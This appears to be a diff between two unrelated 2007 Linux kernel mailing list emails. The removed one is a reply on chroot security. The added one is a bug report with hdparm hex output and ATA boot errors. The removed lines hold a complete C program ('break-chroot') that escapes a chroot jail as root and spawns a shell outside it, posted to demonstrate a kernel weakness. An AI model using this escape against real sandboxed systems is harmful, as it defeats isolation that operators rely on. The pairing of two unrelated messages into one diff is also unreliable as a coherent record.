@@ -1,92 +1,85 @@
-Return-Path: <linux-kernel-owner+w=401wt.eu-S1757236AbXIZKDd@vger.kernel.org>
+Return-Path: <linux-kernel-owner+w=401wt.eu-S1757420AbXIZKEk@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1757236AbXIZKDd (ORCPT <rfc822;w@1wt.eu>);
-	Wed, 26 Sep 2007 06:03:33 -0400
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1754687AbXIZKD0
+	id S1757420AbXIZKEk (ORCPT <rfc822;w@1wt.eu>);
+	Wed, 26 Sep 2007 06:04:40 -0400
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1754821AbXIZKEc
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Wed, 26 Sep 2007 06:03:26 -0400
-Received: from box.memset.com ([89.200.136.113]:54741 "EHLO box.memset.com"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1754332AbXIZKDZ (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Wed, 26 Sep 2007 06:03:25 -0400
-X-Greylist: delayed 1505 seconds by postgrey-1.27 at vger.kernel.org; Wed, 26 Sep 2007 06:03:25 EDT
-To: linux-kernel@vger.kernel.org
-Cc: Al Viro <viro@ftp.linux.org.uk>
-Subject: Re: sys_chroot+sys_fchdir Fix
-In-Reply-To: <97sX2-p1-3@gated-at.bofh.it>
-References: <952DN-83o-31@gated-at.bofh.it> <954cl-29C-3@gated-at.bofh.it> <95ctn-74b-15@gated-at.bofh.it> <95cMH-7um-19@gated-at.bofh.it> <95gdA-4OZ-7@gated-at.bofh.it> <95UE2-1oR-19@gated-at.bofh.it> <95V72-2ly-17@gated-at.bofh.it> <97pG8-3B5-47@gated-at.bofh.it> <97sX2-p1-3@gated-at.bofh.it>
-Date: Wed, 26 Sep 2007 10:38:17 +0100
-Message-Id: <20070926093818.33A8014C2BF@irishsea.home.craig-wood.com>
-From: nick@craig-wood.com (Nick Craig-Wood)
+	Wed, 26 Sep 2007 06:04:32 -0400
+Received: from mailout08.sul.t-online.de ([194.25.134.20]:55201 "EHLO
+	mailout08.sul.t-online.com" rhost-flags-OK-OK-OK-OK)
+	by vger.kernel.org with ESMTP id S1754658AbXIZKEb (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Wed, 26 Sep 2007 06:04:31 -0400
+Message-ID: <46FA2E84.90708@t-online.de>
+Date: Wed, 26 Sep 2007 12:03:48 +0200
+From: Bernd Schmidt <bernds_cb1@t-online.de>
+User-Agent: Thunderbird 2.0.0.6 (X11/20070810)
+MIME-Version: 1.0
+To: Jeff Garzik <jeff@garzik.org>
+CC: "Berck E. Nash" <flyboy@gmail.com>,
+       "linux-ide@vger.kernel.org" <linux-ide@vger.kernel.org>,
+       "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>
+Subject: Re: 2.6.23-rc7-mm1 AHCI ATA errors -- won't boot
+References: <46F7FBCB.4030803@gmail.com> <46F9E2CB.9000002@garzik.org>
+In-Reply-To: <46F9E2CB.9000002@garzik.org>
+Content-Type: text/plain; charset=ISO-8859-1; format=flowed
+Content-Transfer-Encoding: 7bit
+X-ID: S+JbQkZSghuBoKtkmVB5DzYEcDyfUe9m0sYQfVs14LKu4MzSOPOKYcU1yfSclAEwPD
+X-TOI-MSGID: f328cb85-93a3-4f5f-8e99-23b5dcb5b24c
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Al Viro <viro@ftp.linux.org.uk> wrote:
->  If you are within chroot jail and capable of chroot(), you can chdir to
->  its root, then chroot() to subdirectory and you've got cwd outside of
->  your new root.  After that you can chdir all way out to original
->  root.
+Jeff Garzik wrote:
+> Would it also be possible for you to send along 'hdparm --Istdout' 
+> output for your config disk thingy, /dev/sdd ?
 
-Here is some code I wrote a while back to demonstrate that escape
-method.
+One of these appears in my system as well (ASUS P5W-DH Deluxe 
+mainboard).  Here's the hdparm output:
 
-/*
- *  Break a chroot
- *
- *  Compile this with
- *
- *     gcc -static -Wall break-chroot.c -o break-chroot
- *
- *  Get a root shell in the chrooted environment and run
- *
- *    ./break-chroot
- *
- *  Nick Craig-Wood <nick@craig-wood.com>
- *
-*/
+/dev/sdb:
+0040 3fff c837 0010 0000 0000 003f 0000
+0000 0000 3030 3030 3030 305f 5f5f 5f5f
+5f5f 5f5f 5f30 5f41 0003 3e00 0004 5247
+4c31 3033 3634 436f 6e66 6967 2020 4469
+736b 2020 2020 2020 2020 2020 2020 2020
+2020 2020 2020 2020 2020 2020 2020 8001
+0000 2f00 4000 0200 0000 0007 3fff 0010
+003f fc10 00fb 0101 0280 0000 0000 0407
+0003 0078 0078 0078 0078 0000 0000 0000
+0000 0000 0000 0000 0201 0000 0000 0000
+007e 001b 0068 5060 4000 0000 1000 4000
+407f 0000 0000 0000 fffe 0000 c0fe 0000
+0000 0000 0000 0000 0001 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0001 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0017 2040
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 0000
+0000 0000 0000 0000 0000 0000 0000 baa5
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <error.h>
-#include <dirent.h>
-#include <sys/stat.h>
-#include <sys/types.h>
+Since about 2.6.17 or 2.6.18, it has been causing long delays while booting:
+ata2: SATA link up 3.0 Gbps (SStatus 123 SControl 300)
+ata2.00: qc timeout (cmd 0xec)
+ata2.00: failed to IDENTIFY (I/O error, err_mask=0x5)
+ata2: port is slow to respond, please be patient (Status 0x80)
+ata2: COMRESET failed (errno=-16)
+ata2: SATA link up 3.0 Gbps (SStatus 123 SControl 300)
+ata2.00: ATA-6: Config  Disk, RGL10364, max UDMA/133
+ata2.00: 640 sectors, multi 1: LBA
+ata2.00: configured for UDMA/133
 
-#define SHELL "bin/sh"		/* no leading / */
 
-int main(void)
-{
-    struct stat buf;
-    if (chdir("/"))
-	perror("chdir /"), exit(1);
-
-    printf("Making escape tunnel\n");
-    mkdir("/tmp", 01777);
-    mkdir("/tmp/escape-tunnel", 0755);
-
-    printf("Doing escape chroot leaving cwd behind\n");
-    if (chroot("/tmp/escape-tunnel"))
-	perror("chroot /tmp/escape-tunnel"), exit(1);
-
-    printf("Exploit cwd being above the root and find a " SHELL " to run\n");
-    do {
-	printf("Going up...\n");
-	if (chdir("../"))
-	    perror("chdir ../"), exit(1);
-    } while (stat(SHELL, &buf) != 0);
-
-    printf("Chrooting back into the root directory\n");
-    if (chroot("."))
-	perror("chroot ."), exit(1);
-
-    printf("If this doesn't error you are out of chroot!\n");
-    if (execl(SHELL, SHELL, 0))
-	perror("exec " SHELL), exit(1);
-
-    printf("Something wicked happened!\n");
-    return 1;
-}
-
--- 
-Nick Craig-Wood <nick@craig-wood.com> -- http://www.craig-wood.com/nick
+Bernd
